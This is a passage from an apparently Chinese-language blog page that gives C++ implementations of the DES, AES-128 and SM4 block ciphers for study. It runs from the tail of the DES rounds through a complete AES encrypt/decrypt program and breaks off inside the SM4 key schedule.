            { 4,  11, 2,  14, 15, 0,  8, 13, 3,  12, 9,  7,  5,  10, 6,  1,  13, 0,  11, 7, 4,  9,  1,  10, 14, 3, 5,  12, 2,  15, 8,  6,  1, 4,  11, 13, 12, 3,  7, 14, 10, 15, 6,  8,  0,  5, 9,  2,  6,  11, 13, 8, 1,  4,  10, 7,  9,  5,  0, 15, 14, 2,  3,  12 },
            { 13, 2,  8, 4,  6,  15, 11, 1,  10, 9, 3, 14, 5, 0,  12, 7, 1,  15, 13, 8,  10, 3,  7, 4, 12, 5, 6,  11, 0, 14, 9,  2,  7,  11, 4,  1, 9, 12, 14, 2,  0,  6, 10, 13, 15, 3,  5,  8,  2, 1, 14, 7, 4,  10, 8, 13, 15, 12, 9,  0,  3,  5, 6, 11 }
    };

    // P盒置换
    int per[32]
            = { 16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23,
                26, 5, 18, 31, 10, 2,  8,  24, 14, 32, 27,
                3,  9, 19, 13, 30, 6,  22, 11, 4,  25 };

    cout &lt;&lt; endl;
    for (int i = 0; i &lt; 16; i++) {
        string right_expanded = permute(right, exp_d, 48);

        string x = xor_(rkb[i], right_expanded);

        // S
        string op = "";
        for (int i = 0; i &lt; 8; i++) {
            int row = 2 * int(x[i * 6] - '0')
                      + int(x[i * 6 + 5] - '0');
            int col = 8 * int(x[i * 6 + 1] - '0')
                      + 4 * int(x[i * 6 + 2] - '0')
                      + 2 * int(x[i * 6 + 3] - '0')
                      + int(x[i * 6 + 4] - '0');
            int val = s[i][row][col];
            op += char(val / 8 + '0');
            val = val % 8;
            op += char(val / 4 + '0');
            val = val % 4;
            op += char(val / 2 + '0');
            val = val % 2;
            op += char(val + '0');
        }
        op = permute(op, per, 32);

        x = xor_(op, left);

        left = x;

        // 交换左右
        if (i != 15) {
            swap(left, right);
        }
        cout &lt;&lt; "轮数: " &lt;&lt; i + 1 &lt;&lt; " " &lt;&lt; bin2hex(left)
             &lt;&lt; " " &lt;&lt; bin2hex(right) &lt;&lt; " " &lt;&lt; rk[i]
             &lt;&lt; endl;
    }

    // 左右结合
    string combine = left + right;

    // IP逆置换
    int final_perm[64]
            = { 40, 8,  48, 16, 56, 24, 64, 32, 39, 7,  47,
                15, 55, 23, 63, 31, 38, 6,  46, 14, 54, 22,
                62, 30, 37, 5,  45, 13, 53, 21, 61, 29, 36,
                4,  44, 12, 52, 20, 60, 28, 35, 3,  43, 11,
                51, 19, 59, 27, 34, 2,  42, 10, 50, 18, 58,
                26, 33, 1,  41, 9,  49, 17, 57, 25 };

    string cipher = bin2hex(permute(combine, final_perm, 64));
    return cipher;
}

int main()
{
    string pt, key;
    cout&lt;&lt;"请输入明文: ";
    cin&gt;&gt;pt;
    cout&lt;&lt;"请输入密文: ";
    cin&gt;&gt;key;
    pt = string_to_hex(pt);
    cout&lt;&lt;pt;
    key = string_to_hex(key);
    key = hex2bin(key);
    int keyp[56]
            = { 57, 49, 41, 33, 25, 17, 9,  1,  58, 50, 42, 34,
                26, 18, 10, 2,  59, 51, 43, 35, 27, 19, 11, 3,
                60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7,
                62, 54, 46, 38, 30, 22, 14, 6,  61, 53, 45, 37,
                29, 21, 13, 5,  28, 20, 12, 4 };

    //密钥生成
    key = permute(key, keyp, 56);

    int shift_table[16] = { 1, 1, 2, 2, 2, 2, 2, 2,
                            1, 2, 2, 2, 2, 2, 2, 1 };

    int key_comp[48] = { 14, 17, 11, 24, 1,  5,  3,  28,
                         15, 6,  21, 10, 23, 19, 12, 4,
                         26, 8,  16, 7,  27, 20, 13, 2,
                         41, 52, 31, 37, 47, 55, 30, 40,
                         51, 45, 33, 48, 44, 49, 39, 56,
                         34, 53, 46, 42, 50, 36, 29, 32 };
    string left = key.substr(0, 28);
    string right = key.substr(28, 28);

    vector&lt;string&gt; rkb;
    vector&lt;string&gt; rk;
    for (int i = 0; i &lt; 16; i++) {
        left = shift_left(left, shift_table[i]);
        right = shift_left(right, shift_table[i]);

        string combine = left + right;

        string RoundKey = permute(combine, key_comp, 48);

        rkb.push_back(RoundKey);
        rk.push_back(bin2hex(RoundKey));
    }

    cout &lt;&lt; "加密:\n";
    string cipher = encrypt(pt, rkb, rk);
    cout &lt;&lt; "密文: " &lt;&lt; cipher &lt;&lt; endl;

    cout &lt;&lt; "解密:\n";
    reverse(rkb.begin(), rkb.end());
    reverse(rk.begin(), rk.end());
    string text = encrypt(cipher, rkb, rk);
    text = hex_to_string(text);
    cout &lt;&lt; "明文: " &lt;&lt; text &lt;&lt; endl;
}
</code></pre>
<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><pre><code class="c++">#include &lt;iostream&gt;
#include &lt;bits/stdc++.h&gt;
#include &lt;stdint.h&gt;
#include&lt;iomanip&gt;
void AddRoundKey(uint8_t mtx[],uint32_t w[]);
uint32_t SubKeys(uint32_t temp);
void SubBytes(uint8_t mtx[],int len);
void KeyExpansion(uint8_t key[], uint32_t new_key[]);
void Display(uint8_t Matrix[]);
void DisplayKeys(uint8_t Matrix[][16]);
uint32_t left_bit_move(uint32_t val, int n);
using namespace std;
uint32_t T[4][256];//存储4张列混淆表
int mixCol[4][4] = {
        {0x02, 0x03, 0x01, 0x01},
        {0x01, 0x02, 0x03, 0x01},
        {0x01, 0x01, 0x02, 0x03},
        {0x03, 0x01, 0x01, 0x02}
};//列混淆矩阵
uint8_t S_Box[16][16] =
        {
                {0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76},
                {0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0},
                {0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15},
                {0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75},
                {0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84},
                {0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF},
                {0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8},
                {0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2},
                {0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73},
                {0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB},
                {0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79},
                {0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08},
                {0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A},
                {0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E},
                {0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF},
                {0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16}
        };
//逆S盒
uint8_t Inv_S_Box[16][16] =
        {
                {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB},
                {0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB},
                {0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E},
                {0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25},
                {0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92},
                {0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84},
                {0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06},
                {0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B},
                {0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73},
                {0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E},
                {0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B},
                {0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4},
                {0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F},
                {0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF},
                {0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61},
                {0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}
        };
//轮密钥加
uint32_t LunMiYaoJia[10] = {0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,
                            0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000};
uint32_t left_bit_move(uint32_t val, int n) {
    uint32_t size = sizeof(val) * 8;
    n = n % size;
    return (val &gt;&gt; (size - n) | (val &lt;&lt; n));//左移
    //return (val &lt;&lt; (size - n) | (val &gt;&gt; n));//右移
}
string string_to_hex(const string&amp; str) //字符串转化为十六进制
{
    string result="";
    string tmp;
    stringstream ss;
    for(int i=0;i&lt;str.size();i++)
    {
        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;
        ss&gt;&gt;tmp;
        result+=tmp;
    }
    return result;
}
string hex_to_string(const std::string&amp; str)
{
    std::string result;
    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符
    {
        std::string byte = str.substr(i, 2);//每次切两个字符
        //将十六进制的string转成long再强转成int再转成char
        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
        result.push_back(chr);//将处理完的字符压入result中
    }
    return result;
}
//制作列混淆表
uint8_t Mul_02(uint8_t x)
{
    if((x&gt;&gt;7) == 0)
        return x&lt;&lt;1;
    else
        return ((x&lt;&lt;1)^0x1b)&amp;0xff;
}
uint32_t get_output_col1(uint8_t x)
{
    x = (uint32_t)x;
    return (Mul_02(x)&lt;&lt;24)|(x&lt;&lt;16)|(x&lt;&lt;8)|(x^ Mul_02(x));
    //2113
}

uint32_t get_output_col2(uint8_t x)
{
    x = (uint32_t)x;
    return ((x^Mul_02(x))&lt;&lt;24)|(Mul_02(x)&lt;&lt;16)|(x&lt;&lt;8)|(x);
    //3211
}
uint32_t get_output_col3(uint8_t x)
{
    x = (uint32_t)x;
    return (x&lt;&lt;24)|((x^Mul_02(x))&lt;&lt;16)|(Mul_02(x)&lt;&lt;8)|(x);
    //1321
}
uint32_t get_output_col4(uint8_t x)
{
    x = (uint32_t)x;
    return (x&lt;&lt;24)|(x&lt;&lt;16)|((x^Mul_02(x))&lt;&lt;8)|(Mul_02(x));
    //1132
}
void get_TAB()
{
    for(int i=0;i&lt;4;i++) {
        for (int j = 0; j &lt; 256; j++) {
            T[i][j]=0;
        }
    }
    for(int i=0;i&lt;256;i++) {
        T[0][i] = get_output_col1((uint8_t) i);
        T[1][i] = get_output_col2((uint8_t) i);
        T[2][i] = get_output_col3((uint8_t) i);
        T[3][i] = get_output_col4((uint8_t) i);
    }
    //输出列混淆表
//    for(int i=0;i&lt;4;i++) {
//        for (int j = 0; j &lt; 256; j++) {
//            //printf("%8x ",T[i][j]);
//            cout &lt;&lt;setw(8)&lt;&lt;setfill('0')&lt;&lt; hex &lt;&lt; T[i][j] &lt;&lt; " ";
//        }
//        cout&lt;&lt;endl;
//    }
}

uint8_t GFMul(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    uint8_t high;
    for (int counter = 0; counter &lt; 8; counter++)
    {
        if ((b &amp; uint8_t(1)) != 0){//判断当前b的最后一位是否为0
            p ^= a;}// p与a异或  即如果b当前最后一位不是0，就加上现在的a
        high = (uint8_t) (a &amp; uint8_t(0x80));//高4位，看是否会溢出，high=1就是溢出
        a &lt;&lt;= 1;//a左移一位，即乘以2
        if (high != 0){//发生溢出
            a ^= 0x1b; }// x^8 + x^4 + x^3 + x + 1
        b &gt;&gt;= 1;//右移，看b的下一位了

    }
    return p;
}

void KeyExpansion(uint8_t key[], uint32_t w[])
{
    int j=0;
    uint32_t temp=0;
    // w[]的前4个就是输入的key
    //初始化w[0]-&gt;w[3]
    for(int i=0; i&lt;4;i++){
        w[i] = (key[4*i]&lt;&lt;24)|(key[4*i+1]&lt;&lt;16)|(key[4*i+2]&lt;&lt;8)|(key[4*i+3]);
        //printf("%d:%x\n",i,w[i]);
    }
    //创建w[4]-&gt;w[43]
    for(int i=4; i&lt;44;i++){
        if(i%4==0){
            temp = left_bit_move(w[i-1],8);//循环左移8位
            temp =  SubKeys(temp);
            w[i] = temp ^ w[i-4] ^ LunMiYaoJia[j++];
            //printf("%d:%x\n",i,w[i]);
        }
        else {
            w[i] = w[i - 1] ^ w[i - 4];
            //printf("%d:%x\n",i,w[i]);
        }
    }
}

void AddRoundKey(uint8_t mtx[],uint32_t w[])
{

    for(int i=0; i&lt;4; i++){
        uint8_t w1 = w[i] &gt;&gt; 24 &amp; 0xff;
        uint8_t w2 = (w[i] &gt;&gt; 16) &amp; 0xff;
        uint8_t w3 = (w[i] &gt;&gt; 8) &amp; 0xff;
        uint8_t w4 = (w[i]) &amp; 0xff;
        mtx[i] ^= w1;  //按列异或
        mtx[i+4] ^= w2;
        mtx[i+8] ^= w3;
        mtx[i+12] ^= w4;
    }
}

//  S盒密钥变换 - 前4位为行号，后4位为列号
uint32_t SubKeys(uint32_t temp)
{
    uint8_t w[4] = {0};
    int j=0;
    //循环4次
    for(int i=3; i&gt;=0; i--){
        w[j++] = (temp&gt;&gt;(i*8))&amp;0xff;
    }
    SubBytes(w,4);
    return (w[0]&lt;&lt;24|w[1]&lt;&lt;16|w[2]&lt;&lt;8|w[3]);
}

//  S盒变换 - 前4位为行号，后4位为列号
void SubBytes(uint8_t mtx[],int len)
{
    for(int i=0; i&lt;len; ++i)
    {
        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行
        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列
        mtx[i] = S_Box[row][col];
    }
}
void InvSubBytes(uint8_t mtx[],int len)
{
    for(int i=0; i&lt;len; ++i)
    {
        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行
        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列
        mtx[i] = Inv_S_Box[row][col];
    }
}
//行移位
void ShiftRows(uint8_t mtx[])
{
    uint8_t temp=mtx[4];
    //第二行左移一位
    for(int i=0; i&lt;3; i++){
        mtx[i+4] = mtx[i+5];
    }
    mtx[7] = temp;
    //第三行左移二位
    for(int i=0; i&lt;2; i++){
        temp = mtx[i+8];
        mtx[i+8] = mtx[i+10];
        mtx[i+10] = temp;
    }
    //第四行左移三位
    temp = mtx[15];
    for(int i=3; i&gt;0; i--) {
        mtx[i + 12] = mtx[i + 11];
    }
    mtx[12] = temp;
}

void InvShiftRows(uint8_t mtx[])
{
    // 第二行循环右移一位
    uint8_t temp = mtx[7];
    for(int i=3; i&gt;0; --i)
        mtx[i+4] = mtx[i+3];
    mtx[4] = temp;
    // 第三行循环右移两位
    for(int i=0; i&lt;2; ++i)
    {
        temp = mtx[i+8];
        mtx[i+8] = mtx[i+10];
        mtx[i+10] = temp;
    }
    // 第四行循环右移三位
    temp = mtx[12];
    for(int i=0; i&lt;3; ++i)
        mtx[i+12] = mtx[i+13];
    mtx[15] = temp;
}

void MixColumns(uint8_t c[])
{
    uint32_t total[4]={0};  //存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列
    uint32_t temp[16]={0};  //存储16个 每个字节从T表得到的32比特的4字节一列
    for(int i=0;i&lt;16;i++){
        temp[i] = T[i/4][c[i]];
    }

    for(int i=0; i&lt;4;i++) {
        total[i] = temp[i] ^ temp[i+4] ^ temp[i+8] ^ temp[i+12];
        c[i] = (total[i]&gt;&gt;24)&amp;0xff;
        c[i+4]=(total[i]&gt;&gt;16)&amp;0xff;
        c[i+8] = (total[i]&gt;&gt;8)&amp;0xff;
        c[i+12] = (total[i])&amp;0xff;
    }
}
void InvMixColumns(uint8_t mtx[])
{
    uint8_t arr[4];
    for(int i=0; i&lt;4; ++i) {
        for (int j = 0; j &lt; 4; ++j)
            arr[j] = mtx[i + j * 4];

        mtx[i] = GFMul(0x0e, arr[0]) ^ GFMul(0x0b, arr[1]) ^ GFMul(0x0d, arr[2]) ^ GFMul(0x09, arr[3]);
        mtx[i + 4] = GFMul(0x09, arr[0]) ^ GFMul(0x0e, arr[1]) ^ GFMul(0x0b, arr[2]) ^ GFMul(0x0d, arr[3]);
        mtx[i + 8] = GFMul(0x0d, arr[0]) ^ GFMul(0x09, arr[1]) ^ GFMul(0x0e, arr[2]) ^ GFMul(0x0b, arr[3]);
        mtx[i + 12] = GFMul(0x0b, arr[0]) ^ GFMul(0x0d, arr[1]) ^ GFMul(0x09, arr[2]) ^ GFMul(0x0e, arr[3]);
    }
}

void Encrypt(uint8_t m[],uint32_t key[],uint8_t c[])
{
    //首先进行开始的轮密钥加
    int round=0;
    uint32_t w[4]={0};
    for(int k=0; k&lt;4; k++)
        w[k] = key[4*round+k];
    for(int i=0; i&lt;16; i++)
        c[i] = m[i];
    AddRoundKey(c,w);
    //接下来是9轮一摸一样的函数
    for(int i = 1;i&lt;=9;i++)
    {
        SubBytes(c,16);//字节替代
        ShiftRows(c);//行移位
        MixColumns(c);//列混淆
        round++;
        //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;
        for(int k=0; k&lt;4; k++) {
            w[k] = key[4 * round + k];
        }
        AddRoundKey(c,w);//轮密钥加
    }
    //最后一轮
    round++;
    //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;
    for(int k=0; k&lt;4; k++) {
        w[k] = key[4 * round + k];
        //("%x ",w[k]);
    }
    SubBytes(c,16);//字节替代
    ShiftRows(c);//行移位
    AddRoundKey(c,w);//轮密钥加
}
void Decrypt(uint8_t c[],uint32_t key[],uint8_t m[])
{
    //首先进行开始的轮密钥加
    //注意密钥反着来
    int round=10;
    uint32_t w[4]={0};
    for(int k=0; k&lt;4; k++)
        w[k] = key[4*round+k];  //密钥赋值
    for(int i=0; i&lt;16; i++)
        m[i] = c[i];
    AddRoundKey(m,w);
    //接下来是9轮一摸一样的函数
    for(int i = 1;i&lt;=9;i++)
    {
        InvShiftRows(m);//行移位
        InvSubBytes(m,16);//字节替代
        round--;
        //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;
        for(int k=0; k&lt;4; k++) {
            w[k] = key[4 * round + k];
        }
        AddRoundKey(m,w);//轮密钥加
        InvMixColumns(m);//列混淆
    }
    //最后一轮
    round--;
    //cout&lt;&lt;"轮数"&lt;&lt;round&lt;&lt;endl;
    for(int k=0; k&lt;4; k++) {
        w[k] = key[4 * round + k];
        //("%x ",w[k]);
    }
    InvShiftRows(m);//行移位
    InvSubBytes(m,16);//字节替代
    AddRoundKey(m,w);//轮密钥加
}
void Display(uint8_t Matrix[])
{
    for(int i=0; i&lt;16; i++) {
        printf("%x ", Matrix[i]);
        if(i%4==3)
            cout&lt;&lt;endl;
    }
}
void DisplayKeys(uint32_t Matrix[])
{
    for(int i=0; i&lt;44; i++) {
        printf("第%d列:%x\n",i,Matrix[i]);
    }
}
int main()
{
    string mingwen;
    string miwen;
    uint8_t key[16]={0};
    uint8_t m[16]={0};
    cout&lt;&lt;"请输入明文(128bits):";
    cin&gt;&gt;mingwen;
    cout&lt;&lt;"请输入密文(128bits):";
    cin&gt;&gt;miwen;
    for(int i=0;i&lt;16;i++)
    {
        m[i] = (uint8_t)(mingwen[i]);
        key[i] = (uint8_t)(miwen[i]);
    }
    uint8_t c[16]={0};
    uint8_t x[16]={0};
    uint32_t new_key[44]={0};   //存储44列密钥
    cout&lt;&lt;"明文:"&lt;&lt;endl;
    Display(m);
    cout&lt;&lt;"密钥:"&lt;&lt;endl;
    Display(key);
    get_TAB();//生成列混淆表
    KeyExpansion(key,new_key);
    cout&lt;&lt;"生成密钥"&lt;&lt;endl;
    //DisplayKeys(new_key);
    Encrypt(m,new_key,c);
    cout&lt;&lt;"加密结果"&lt;&lt;endl;
    Display(c);
    Decrypt(c,new_key,x);
    cout&lt;&lt;"解密结果(hex)"&lt;&lt;endl;
    Display(x);
    cout&lt;&lt;"解密结果(string)"&lt;&lt;endl;
    for(int i=0;i&lt;16;i++)
        cout&lt;&lt;(char)x[i];
    return 0;
}
</code></pre>
<h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><pre><code class="c++">#include "string.h"
#include&lt;iostream&gt;
#include &lt;stdint.h&gt;
#include&lt;string&gt;
using namespace std;
uint32_t shift_l(uint32_t s,int n)//循环左移n位
{
    int size=sizeof (s)*8;      //字节数乘以8代表一共多少位
    return s&lt;&lt;(n)|(s&gt;&gt;size-n);
}
uint32_t Sb(uint32_t s) {

    uint8_t SboxTable[16][16] =
            {
                    {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},
                    {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},
                    {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},
                    {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},
                    {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},
                    {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},
                    {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},
                    {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},
                    {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},
                    {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},
                    {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},
                    {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},
                    {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},
                    {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},
                    {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},
                    {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};
    uint8_t a[4];
    a[0]=(s&gt;&gt;24)&amp;0xff;     //最高8位
    a[1]=(s&gt;&gt;16)&amp;0xff;
    a[2]=(s&gt;&gt;8)&amp;0xff;
    a[3]=s&amp;0xff;
    uint8_t b[4];
    for(int i=0;i&lt;4;i++) {
        int row = ((a[i] &gt;&gt; 7) &amp; 1) * 8 + ((a[i] &gt;&gt; 6) &amp; 1) * 4 + ((a[i] &gt;&gt; 5) &amp; 1) * 2 + ((a[i] &gt;&gt; 4) &amp; 1) * 1;
        int col = ((a[i] &gt;&gt; 3) &amp; 1) * 8 + ((a[i] &gt;&gt; 2) &amp; 1) * 4 + ((a[i] &gt;&gt; 1) &amp; 1) * 2 + ((a[i]) &amp; 1) * 1;
        b[i] = SboxTable[row][col];
    }
    uint32_t result;
    result=(b[0]&lt;&lt;24)|(b[1]&lt;&lt;16)|(b[2]&lt;&lt;8)|b[3];
    return result;
}

uint32_t L_change(uint32_t s)
{
    return s^ shift_l(s,13)^ shift_l(s,23);
}

uint32_t T_change(uint32_t s)
{
    return L_change(Sb(s));
}

void keyexpand(uint32_t MK[4],uint32_t rk[32])
{
    uint32_t FK[4]={0xA3B1BAC6, 0x56AA3350,0x677D9197, 0xB27022DC};
    uint32_t CK[32] = { 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,
                        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,
                        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,
                        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,
                        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,
                        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,
                        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,
                        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 };
    uint32_t k[4]={MK[0]^FK[0],MK[1]^FK[1],MK[2]^FK[2],MK[3]^FK[3]};
    uint32_t K[36];
    for(int i=0;i&lt;=3;i++)
        K[i]=k[i];
    for(int i=0;i&lt;32;i++)
    {
        K[i+4]=K[i]^ T_change(K[i+1]^K[i+2]^K[i+3]^CK[i]);
    }
    for(int i=0;i&lt;32;i++)
        rk[i]=K[i+4];

}

uint32_t Lchange(uint32_t s)
{
